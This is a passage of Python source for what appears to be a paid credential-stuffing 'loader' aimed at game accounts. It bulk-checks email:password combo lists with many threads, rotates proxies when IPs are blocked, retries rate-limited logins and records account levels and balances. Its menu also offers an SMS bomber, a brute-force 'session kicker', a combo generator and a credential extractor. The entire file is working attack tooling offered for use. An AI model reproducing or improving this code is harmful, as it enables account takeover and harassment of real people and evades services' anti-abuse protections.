            status, info = processaccount(session, account, password, cookie_manager, datadome_mgr, live_stats, results_manager, file_manager, selected_file, auto_remove, suppress_print=True, proxy_manager=proxy_manager if using_proxy else None)
            return (status, account, info)
        except Exception:
            return ('ERROR', account_line, {})
            
    def _wrapped_worker(account_line):
        nonlocal overall_done
        with index_lock:
            account_index_counter[0] += 1
            my_index = account_index_counter[0]
        acc_name = account_line.split(':', 1)[0].strip() if ':' in account_line else account_line
        
        while True:
            if _SHUTDOWN.is_set(): 
                _enqueue_retry(account_line, 'shutdown')
                return
                
            status, acc_name, info = _worker(account_line)
            
            if status == 'IP_CHANGED':
                if hasattr(_thread_local, 'session'):
                    try: _thread_local.session.close()
                    except: pass
                    del _thread_local.session
                if hasattr(_thread_local, 'datadome'):
                    del _thread_local.datadome
                if using_proxy and proxy_manager and proxy_manager.enabled:
                    proxy = proxy_manager.get_next()
                    if proxy:
                        proxy_url = proxy.get('http') or proxy.get('https')
                        proxy_line = proxy_manager._index
                        dashboard.set_current_proxy(proxy=proxy_url, line=proxy_line)
                time.sleep(2)
                continue
            
            # GUARANTEE: Mark done in ledger so it's never processed again
            if status == 'DONE':
                _mark_done(account_line)
            elif status == 'ERROR':
                reason = info.get('error_reason', 'network_error') if isinstance(info, dict) else 'network_error'
                _enqueue_retry(account_line, reason)
            break
            
        if info and isinstance(info, dict):
            dashboard.record(my_index, acc_name, success=info.get('success', False), 
                             is_clean=info.get('is_clean', False), has_codm=info.get('has_codm', False), 
                             codm_level=info.get('codm_level', 0), shell_balance=info.get('shell_balance', 0),
                             error_reason=info.get('error_reason', 'Invalid'))
        else:
            dashboard.record(my_index, acc_name, success=False, error_reason='Invalid')
            
        with stats_lock:
            overall_done += 1
            
    # Bounded queue to prevent memory spikes
    work_q = queue.Queue(maxsize=num_threads * 4)
    
    def producer():
        for ln in pending_accounts:
            if _SHUTDOWN.is_set(): break
            work_q.put(ln)
        for _ in range(num_threads):
            work_q.put(None)  # Sentinel to stop workers

    def consumer():
        while True:
            item = work_q.get()
            if item is None or _SHUTDOWN.is_set():
                work_q.task_done()
                break
            _wrapped_worker(item)
            work_q.task_done()

    prod_t = threading.Thread(target=producer, daemon=True)
    prod_t.start()
    
    cons_t = [threading.Thread(target=consumer, daemon=True) for _ in range(num_threads)]
    for c in cons_t: c.start()
    
    try:
        # Wait for producer to finish putting items AND queue to empty
        while prod_t.is_alive() or work_q.unfinished_tasks > 0:
            if _SHUTDOWN.is_set():
                break
            time.sleep(0.1)
    except KeyboardInterrupt:
        _SHUTDOWN.set()
        _log('WARNING', 'Interrupted — shutting down...')
    finally:
        # If interrupted, clear queue and send sentinels to unblock consumers
        if _SHUTDOWN.is_set():
            try:
                while True:
                    work_q.get_nowait()
                    work_q.task_done()
            except queue.Empty:
                pass
            for _ in range(num_threads):
                work_q.put(None)
                
        # Wait for consumers to finish
        for c in cons_t:
            c.join(timeout=1.0)
            
        dashboard.stop()
        sys.stdout.write('\x1b[H\x1b[J')
        sys.stdout.flush()
        _suppress_ip_prints = False
        _ip_block_callback = None
        
        print()
        _log('INFO', '[dim]Finalizing result files (sorting)...[/dim]')
        for f in results_manager.base_dir.rglob('*.txt'):
            try:
                sort_by = 'shell' if 'Shell' in str(f) else 'level'
                results_manager.finalize_sort(f, sort_by=sort_by)
            except: pass

        # ─── NEW ROBUST RETRY LOGIC + AUTO OPTION 5 ──────────────────────────
        if _RETRY_FILE.exists():
            _log('WARNING', 'Filtering retry queue for transient errors...')
            
            transient_reasons = {
                'network/proxy error', 
                'rate limited / network error', 
                'connection/timeout error', 
                'ip change timeout', 
                'cookie banned/ip blocked', 
                'invalid server response',
                'network_error',
                'rate_limited',
                'unknown login error'
            }
            
            transient_accounts = []
            permanent_accounts = []
            
            try:
                with open(_RETRY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        if '\t' in line:
                            combo, reason = line.split('\t', 1)
                            if reason.strip().lower() in transient_reasons:
                                transient_accounts.append(combo.strip())
                            else:
                                permanent_accounts.append((combo.strip(), reason.strip()))
                        else:
                            transient_accounts.append(line)
                            
                _RETRY_FILE.unlink()
            except Exception as e:
                _log('ERROR', f'Failed to read retry queue: {e}')
                transient_accounts = []
                permanent_accounts = []
            
            # Re-enqueue permanent errors so they are available for the Option 5 cleanup
            for combo, reason in permanent_accounts:
                _enqueue_retry(combo, reason)
            
            if transient_accounts:
                _log('INFO', f'Found [bold]{len(transient_accounts)}[/bold] transient errors to retry ([dim]{len(permanent_accounts)} permanent ignored[/dim]).')
                
                with ThreadPoolExecutor(max_workers=5) as retry_executor:
                    futures = {retry_executor.submit(_wrapped_worker, acc): acc for acc in transient_accounts}
                    for future in as_completed(futures):
                        try:
                            future.result()
                        except Exception:
                            pass
                            
                _log('SUCCESS', 'Transient retry phase completed.')
            else:
                _log('INFO', f'No transient errors to retry ([dim]{len(permanent_accounts)} permanent ignored[/dim]).')

            # ─── AUTO OPTION 5: Clean combo file of dead + already-done accounts ───
            # Merge targets from BOTH the retry queue (dead accounts) AND the done ledger
            # (accounts that were successfully processed) so they are removed from the
            # selected combo file — mirroring the manual Option 5 behaviour.
            targets = set()
            retry_dead_count = 0
            done_ledger_count = 0

            # Source 1: Retry queue — only "Account Doesn't Exist" / "error_auth"
            if _RETRY_FILE.exists():
                _log('INFO', '[dim]Running automatic Option 5 (Retry Cleaner)...[/dim]')
                try:
                    with open(_RETRY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            line = line.strip()
                            if not line:
                                continue
                            if '\t' in line:
                                combo, reason = line.split('\t', 1)
                                reason_lower = reason.strip().lower()
                                if "account doesn't exist" in reason_lower or "error_auth" in reason_lower:
                                    if combo:
                                        targets.add(combo.strip())
                                        retry_dead_count += 1
                except Exception:
                    pass

            # Source 2: Done ledger — every account that was successfully processed
            if _DONE_LEDGER.exists():
                try:
                    with open(_DONE_LEDGER, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            combo = line.strip()
                            if combo:
                                if combo not in targets:
                                    done_ledger_count += 1
                                targets.add(combo)
                except Exception:
                    pass

            if targets:
                _log('INFO', f'Cleanup targets: [bold]{len(targets):,}[/bold] '
                            f'([bright_yellow]{retry_dead_count:,}[/bright_yellow] dead '
                            f'+ [bright_cyan]{done_ledger_count:,}[/bright_cyan] done-ledger)')

                try:
                    temp_path = Path(selected_file).with_suffix('.tmp')
                    removed = 0
                    with open(selected_file, 'r', encoding='utf-8', errors='ignore') as fin:
                        lines = fin.readlines()
                    with open(temp_path, 'w', encoding='utf-8') as fout:
                        for line in lines:
                            stripped = line.strip()
                            if stripped and stripped in targets:
                                removed += 1
                            else:
                                fout.write(line)
                    temp_path.replace(selected_file)
                    _log('SUCCESS', f'Combo auto-cleaned: Removed [bold bright_red]{removed:,}[/bold bright_red] '
                                    f'accounts from [bright_cyan]{Path(selected_file).name}[/bright_cyan] '
                                    f'[dim](dead {retry_dead_count:,} + done {done_ledger_count:,})[/dim]')
                except Exception as e:
                    _log('ERROR', f'Failed to auto-clean combo file: {e}')
            else:
                _log('INFO', '[dim]No cleanup targets found (no dead accounts, no done ledger).[/dim]')

            # Automatically remove _retry_queue.txt as requested
            if _RETRY_FILE.exists():
                try:
                    _RETRY_FILE.unlink()
                    _log('INFO', '[dim]Retry queue automatically cleared.[/dim]')
                except Exception:
                    pass

        live_stats.display_final_stats()
        _flush_auto_remove(file_manager, selected_file, force=True)
        cookie_manager.stop()
        print(f'  {_DIM}Results saved in real-time to Results/{_RST}')
        print()
        input(f'  {_DIM}Press Enter to return to menu{_RST} ')
        
def display_main_menu() -> str:
    clear_screen()
    display_banner()

    w = 68
    user = _USER_KEY_SESSION.get("username") or "user"
    key  = _USER_KEY_SESSION.get("key") or "—"
    exp  = _fmt_remain_key(_USER_KEY_SESSION.get("expires_at"))

    print(f"  {_A_PRIMARY}[ {_A_BOLD}COSMIC SYSTEM{_A_RST}{_A_PRIMARY} ]{_A_RST}  "
          f"{_A_DIM}Welcome,{_A_RST} {_A_BRIGHT}{_A_BOLD}{user}{_A_RST}")
    key_short = key if len(key) <= 30 else key[:27] + "…"
    print(f"  {_A_DIM}Key: {_A_ACCENT}{key_short}{_A_RST}  {_A_DIM}·  Expires: {_A_SUCCESS}{exp}{_A_RST}")
    print()

    print(f"  {_A_PRIMARY}┌{'─' * w}┐{_A_RST}")
    title = "◆  S E L E C T   M O D E  ◆"
    pad = (w - len(title)) // 2
    print(f"  {_A_PRIMARY}│{_A_RST}{' ' * pad}{_A_BRIGHT}{_A_BOLD}{title}{_A_RST}"
          f"{' ' * (w - len(title) - pad)}{_A_PRIMARY}│{_A_RST}")
    print(f"  {_A_PRIMARY}├{'─' * w}┤{_A_RST}")
    print(f"  {_A_PRIMARY}│{_A_RST}{'':^{w}}{_A_PRIMARY}│{_A_RST}")

    for num, label, desc, color in [
    ("1", "▸ Bulk Check",       "— scan accounts from combo file", _A_ACCENT),
    ("2", "▸ Dev ID Checker",   "— MLBB device ID tools",          _A_PRIMARY),
    ("3", "▸ Session Info",     "— view current key details",      _A_SOFT),
    ("4", "▸ Proxy Scraper",    "— scrape fresh working proxies",  _A_SUCCESS),
        ("5", "▸ SMS Bomber",       "— SMS + NGL bomber (PH only)",    _A_WARNING),
        ("6", "▸ Separator",        "— split combo by keyword (2-grid)", _A_SOFT),
    ("7", "▸ Decoder/Encoder",  "— decode & encode obfuscated code", _A_ACCENT),

    ("8", "▸ URL Remover",      "— extract creds, remove URLs",      _A_ACCENT),

    ("9", "▸ Logout Key",       "— clear session and re-login",      _A_WARNING),
    ("10", "▸ Account Manager",  "— view + filter results dashboard", _A_SUCCESS),
    ("11", "▸ Combo Generator",  "— auto-generate email:pass", _A_PRIMARY),
    ]:
        key_part   = f"{color}[{_A_BOLD}{num}{_A_RST}{color}]{_A_RST}"
        label_part = f"{_A_BRIGHT}{_A_BOLD}{label}{_A_RST}"
        desc_part  = f"{_A_DIM}{desc}{_A_RST}"
        line = f"  {key_part}  {label_part}   {desc_part}"
        vis  = len(f"  [{num}]  {label}   {desc}")
        print(f"  {_A_PRIMARY}│{_A_RST}{line}{' ' * max(w - vis, 0)}{_A_PRIMARY}│{_A_RST}")
        print(f"  {_A_PRIMARY}│{_A_RST}{'':^{w}}{_A_PRIMARY}│{_A_RST}")

    print(f"  {_A_PRIMARY}└{'─' * w}┘{_A_RST}")
    print()

    credit = (
        f"{_A_DIM}Powered by{_A_RST} "
        f"{_A_PRIMARY}{_A_BOLD}@LEGITCosmicDev2nd{_A_RST} "
        f"{_A_DIM}×{_A_RST} "
        f"{_A_BRIGHT}{_A_BOLD}@LEGITCosmicDev{_A_RST}"
    )
    print(f"  {_A_DIM}{'─' * w}{_A_RST}")
    credit_vis = len(re.sub(r"\033\[[0-9;]*m", "", credit))
    pad = max((w - credit_vis) // 2, 0)
    print(f"  {' ' * pad}{credit}")
    print(f"  {_A_DIM}{'─' * w}{_A_RST}")
    print()

    prompt = f"  {_A_ACCENT}❯ Select [1-11]:{_A_RST} "
    while True:
        try:
            choice = input(prompt).strip()
            if choice in ("1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11"):
                return choice
            print(f"  {_A_ERROR}✖ Enter 1-11.{_A_RST}")
        except KeyboardInterrupt:
            print()
            return "q"


def show_session_info():
    clear_screen()
    display_banner()

    w = 60
    print(f"  {_A_PRIMARY}┌{'─' * w}┐{_A_RST}")
    title = "◆  SESSION INFORMATION  ◆"
    pad = (w - len(title)) // 2
    print(f"  {_A_PRIMARY}│{_A_RST}{' ' * pad}{_A_BRIGHT}{_A_BOLD}{title}{_A_RST}"
          f"{' ' * (w - len(title) - pad)}{_A_PRIMARY}│{_A_RST}")
    print(f"  {_A_PRIMARY}├{'─' * w}┤{_A_RST}")

    key = _USER_KEY_SESSION.get("key") or "—"
    user = _USER_KEY_SESSION.get("username") or "user"
    exp = _fmt_remain_key(_USER_KEY_SESSION.get("expires_at"))
    uses = _USER_KEY_SESSION.get("uses", 0)

    data = _keys_load()
    rec = data["keys"].get(key.upper(), {})

    created = rec.get("created_at", "—")
    try:
        created_disp = datetime.fromisoformat(created).strftime("%B %d, %Y | %I:%M %p")
    except Exception:
        created_disp = created

    price = rec.get("price", "—")
    note = rec.get("note", "") or "—"

    rows = [
        ("Username", user),
        ("Key", key),
        ("Status", "✅ Active"),
        ("Expires", exp),
        ("Uses", str(uses)),
        ("Created", created_disp),
        ("Price", f"₱ {price}"),
        ("Note", note),
    ]

    for label, val in rows:
        label_str = f"  {_A_WHITE}{label:<12}{_A_RST}"
        val_str = f"{_A_BRIGHT}{val}{_A_RST}"
        vis = len(f"  {label:<12} {val}")
        print(f"  {_A_PRIMARY}│{_A_RST}{label_str} {val_str}{' ' * max(w - vis, 0)}{_A_PRIMARY}│{_A_RST}")

    print(f"  {_A_PRIMARY}└{'─' * w}┘{_A_RST}")
    print()
    input(f"  {_A_DIM}Press Enter to return…{_A_RST} ")


def append_session_log(entry: str):
    try:
        with open(SESSION_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().isoformat()}] {entry}\n")
    except Exception:
        pass

    def vlen(s): return len(re.sub(r"\033\[[0-9;]*m", "", s))

    total1 = vlen(left)
    gap1 = max(w - total1, 1)
    print(f"  {L_bar}{left}{' ' * gap1}{R_bar}")

    credit_vis = vlen(credit)
    pad_l = max((w - credit_vis) // 2, 0)
    pad_r = max(w - credit_vis - pad_l, 0)
    print(f"  {L_bar}{' ' * pad_l}{credit}{' ' * pad_r}{R_bar}")

    print(f"  {bottom_rule}")
    print()
    
def run_devid_checker():
    """Launch the Dev ID Checker sub-menu."""
    clear_screen()
    display_banner()

    if not _DEV_ID_CHECKER_AVAILABLE:
        print(f"\n  {_A_ERROR}✖  Dev ID Checker module not found!{_A_RST}")
        print(f"  {_A_DIM}Make sure 'Dev_Id_checker.py' is in the same folder.{_A_RST}")
        print()
        input(f"  {_A_DIM}Press Enter to return…{_A_RST} ")
        return

    while True:
        clear_screen()
        display_banner()

        w = 60
        print(f"  {_A_PRIMARY}┌{'─' * w}┐{_A_RST}")
        title = "◆  DEV ID CHECKER  ◆"
        pad = (w - len(title)) // 2
        print(f"  {_A_PRIMARY}│{_A_RST}{' ' * pad}{_A_BRIGHT}{_A_BOLD}{title}{_A_RST}"
              f"{' ' * (w - len(title) - pad)}{_A_PRIMARY}│{_A_RST}")
        print(f"  {_A_PRIMARY}├{'─' * w}┤{_A_RST}")

        options = [
            ("1", "Generate Device IDs",      "— bulk generate"),
            ("2", "Bulk Check (8-REQ)",       "— full account detail"),
            ("3", "Show Statistics",          "— view counters"),
            ("4", "Clean Output Files",       "— wipe results"),
            ("5", "Test Telegram",            "— verify bot"),
            ("6", "Brute Force / Spam Login", "— session kicker"),
            ("7", "Single Account Check",     "— one device"),
            ("0", "Back to Cosmic Menu",      "— return"),
        ]
        for num, label, desc in options:
            color = _A_ERROR if num == "0" else _A_ACCENT
            line = f"  {color}[{num}]{_A_RST}  {_A_BRIGHT}{label:<26}{_A_RST} {_A_DIM}{desc}{_A_RST}"
            vis = len(f"  [{num}]  {label:<26} {desc}")
            print(f"  {_A_PRIMARY}│{_A_RST}{line}{' ' * max(w - vis, 0)}{_A_PRIMARY}│{_A_RST}")

        print(f"  {_A_PRIMARY}└{'─' * w}┘{_A_RST}")
        print()

        try:
            choice = input(f"  {_A_ACCENT}❯ Select (0-7):{_A_RST} ").strip()
        except (KeyboardInterrupt, EOFError):
            return

        if choice == "0":
            return
        elif choice == "1":
            _devid.run_generator_menu()
        elif choice == "2":
            _devid.run_bulk_detail()
        elif choice == "3":
            _devid.show_stats()
        elif choice == "4":
            _devid.run_cleanup()
        elif choice == "5":
            _devid.test_telegram()
        elif choice == "6":
            _devid.run_bruteforce_login()
        elif choice == "7":
            _devid.run_single_check()
        else:
            print(f"  {_A_ERROR}✖ Invalid choice.{_A_RST}")
            time.sleep(1)


def run_proxy_scraper():
    """Wrapper: launch proxy scraper module."""
    if _PROXY_SCRAPER_AVAILABLE:
        return _proxy_scraper.run_proxy_scraper()
    print("Proxy scraper not available")


def run_sms_bomber():
    """Wrapper: launch SMS bomber module."""
    if _SMS_BOMBER_AVAILABLE:
        return _sms_bomber.run_sms_bomber()
    print("SMS bomber not available")


def run_separator():
    """Wrapper: launch separator module."""
    if _SEPARATOR_AVAILABLE:
        return _separator.run_separator()
    print("Separator not available")


def run_decoder_encoder_menu():
    """Wrapper: launch decoder/encoder module."""
    if _DEC_ENC_AVAILABLE:
        return _dec_enc.run_decoder_encoder_menu()
    print("Decoder/Encoder not available")


def run_url_remover():
    """Wrapper: launch URL remover module."""
    if _URL_RM_AVAILABLE:
        return _url_rm.run_url_remover()
    print("URL Remover not available")


def run_account_manager():
    """Wrapper: launch account manager module."""
    if _ACC_MGR_AVAILABLE:
        return _acc_mgr.run_account_manager()
    print("Account manager not available")


def run_combo_generator():
    """Wrapper: launch combo generator module."""
    if _COMBO_GEN_AVAILABLE:
        return _combo_gen.run_combo_generator()
    print("Combo generator not available")


def run_thread_manager():
    """Wrapper: launch thread manager module."""
    if _THREAD_MGR_AVAILABLE:
        return _thread_mgr.run_thread_manager()
    print("Thread manager not available")


def main():
    Path("Combo").mkdir(exist_ok=True)
    Path("Results").mkdir(exist_ok=True)
    BACKUP_DIR.mkdir(exist_ok=True)

    # ─── STARTUP TASKS ───
    _audit("session_start", "loader booted")
    _auto_cleanup_expired_keys()
    _backup_keys()

    # ─── AUTO-UPDATE CHECK ───
    if _UPDATER_AVAILABLE:
        try:
            update_info = _updater.check_updates()
            if update_info.get("update_available") or update_info.get("announcement"):
                _updater.show_update_banner(update_info)
                if update_info.get("update_available"):
                    print(f"  {_A_DIM}Press Enter to continue kahit may update...{_A_RST}")
                    try:
                        input()
                    except (KeyboardInterrupt, EOFError):
                        pass
        except Exception:
            pass

    # ─── FORCED KEY LOGIN ───
    if not key_login():
        print(f"\n  {_A_ERROR}✖  Access denied. Exiting.{_A_RST}\n")
        sys.exit(1)

    # ─── AUTO-UPDATE + ANNOUNCEMENT (after login) ───
    if _UPDATER_AVAILABLE:
        try:
            update_info = _updater.check_updates(force=True)
            
            # Show announcement banner first
            if update_info.get("announcement"):
                _updater.show_update_banner(update_info)
                print(f"  {_A_DIM}Press Enter to continue...{_A_RST}")
                try:
                    input()
                except (KeyboardInterrupt, EOFError):
                    pass
            
            # Auto-apply code updates
            if update_info.get("update_available"):
                print()
                print(f"  {_A_WARNING}⚠  Update {update_info['latest_version']} available!{_A_RST}")
                print(f"  {_A_DIM}Auto-downloading updates from GitHub...{_A_RST}")
                print()
                
                try:
                    ok, updated, failed = _updater.apply_update(
                        update_info.get("files_to_update")
                    )
                    
                    if ok:
                        print()
                        print(f"  {_A_SUCCESS}✅ Updated {len(updated)} file(s){_A_RST}")
                        for f in updated:
                            print(f"  {_A_DIM}   • {f}{_A_RST}")
                        
                        if failed:
                            print(f"  {_A_WARNING}⚠  {len(failed)} file(s) failed:{_A_RST}")
                            for f in failed:
                                print(f"  {_A_DIM}   • {f}{_A_RST}")
                        
                        # Regenerate integrity para walang tamper warning
                        try:
                            import security
                            security.generate_integrity()
                            print(f"  {_A_DIM}🔒 Integrity regenerated{_A_RST}")
                        except Exception:
                            pass
                        
                        print()
                        print(f"  {_A_SUCCESS}{_A_BOLD}✅ Update applied! Restart mo yung loader:{_A_RST}")
                        print(f"  {_A_BRIGHT}   python3 cosmicloaderFORSALE.py{_A_RST}")
                        print()
                        try:
                            input(f"  {_A_DIM}Press Enter to exit...{_A_RST}")
                        except (KeyboardInterrupt, EOFError):
                            pass
                        sys.exit(0)
                    else:
                        print(f"  {_A_WARNING}⚠  Update failed — continuing with old version{_A_RST}")
                        time.sleep(2)
                except Exception as e:
                    print(f"  {_A_WARNING}⚠  Update error: {e}{_A_RST}")
                    time.sleep(2)
        except Exception:
            pass


    # ─── MAIN LOOP ───
    while True:
        choice = display_main_menu()

        if choice == "1":
            bulk_check()

        elif choice == "2":
            run_devid_checker()

        elif choice == "3":
            show_session_info()

        elif choice == "4":
            if _PROXY_SCRAPER_AVAILABLE:
                _proxy_scraper.run_proxy_scraper()
            else:
                clear_screen()
                display_banner()
                print(f"\n  {_A_ERROR}✖  proxy_scraper.py not found!{_A_RST}")
                input(f"\n  {_A_DIM}Press Enter…{_A_RST} ")

        elif choice == "5":
            if _SMS_BOMBER_AVAILABLE:
                _sms_bomber.run_sms_bomber()
            else:
                clear_screen()
                display_banner()
                print(f"\n  {_A_ERROR}✖  sms_bomber.py not found!{_A_RST}")
                print(f"  {_A_DIM}Make sure it's in the same folder.{_A_RST}")
                try:
                    print(f"  {_A_DIM}Error: {_SMS_BOMBER_ERROR}{_A_RST}")
                except Exception:
                    pass
                input(f"\n  {_A_DIM}Press Enter…{_A_RST} ")

        elif choice == "6":
            if _SEPARATOR_AVAILABLE:
                _separator.run_separator()
            else:
                clear_screen()
                display_banner()
                print(f"\n  {_A_ERROR}✖  separator.py not found!{_A_RST}")
                print(f"  {_A_DIM}Make sure it's in the same folder.{_A_RST}")
                try:
                    print(f"  {_A_DIM}Error: {_SEPARATOR_ERROR}{_A_RST}")
                except Exception:
                    pass
                input(f"\n  {_A_DIM}Press Enter…{_A_RST} ")

        elif choice == "7":


            if _DEC_ENC_AVAILABLE:


                _dec_enc.run_decoder_encoder_menu()


            else:


                clear_screen()


                display_banner()


                print(f"\n  {_A_ERROR}✖  decoder_encoder.py not found!{_A_RST}")


                input(f"\n  {_A_DIM}Press Enter…{_A_RST} ")



        elif choice == "8":


            if _URL_RM_AVAILABLE:


                _url_rm.run_url_remover()


            else:


                clear_screen()


                display_banner()


                print(f"\n  {_A_ERROR}✖  url_remover.py not found!{_A_RST}")


                input(f"\n  {_A_DIM}Press Enter…{_A_RST} ")



        elif choice == "9":


            _session_clear()
            _USER_KEY_SESSION.update({
                "key": None, "expires_at": None,
                "uses": 0, "username": None,
            })
            print(f"\n  {_A_WARNING}✔  Session cleared. Please log in again.{_A_RST}")
            time.sleep(1.2)
            if not key_login():
                print(f"\n  {_A_ERROR}✖  Access denied. Exiting.{_A_RST}\n")
                sys.exit(1)

        elif choice == "10":
            if _ACC_MGR_AVAILABLE:
                _acc_mgr.run_account_manager()
            else:
                clear_screen()
                display_banner()
                print(f"\n  {_A_ERROR}✖  account_manager.py not found!{_A_RST}")
                input(f"\n  {_A_DIM}Press Enter…{_A_RST} ")

        elif choice == "11":
            if _COMBO_GEN_AVAILABLE:
                _combo_gen.run_combo_generator()
            else:
                clear_screen()
                display_banner()
                print(f"\n  {_A_ERROR}✖  combo_generator.py not found!{_A_RST}")
                input(f"\n  {_A_DIM}Press Enter…{_A_RST} ")

        elif choice == "q":
            break
            
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n  {_YL}⚠  Script terminated by user.{_RST}\n')
    except Exception as e:
        import traceback
        error_msg = str(e)
        print(f'\n  {_RD}✖  Unexpected error: {error_msg}{_RST}')
        traceback.print_exc()
        try:
            with open('error_log.txt', 'a', encoding='utf-8') as f:
                f.write(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}] ERROR: {error_msg}\n')
                f.write(traceback.format_exc())
                f.write('\n' + '-'*60 + '\n')
        except Exception:
            pass
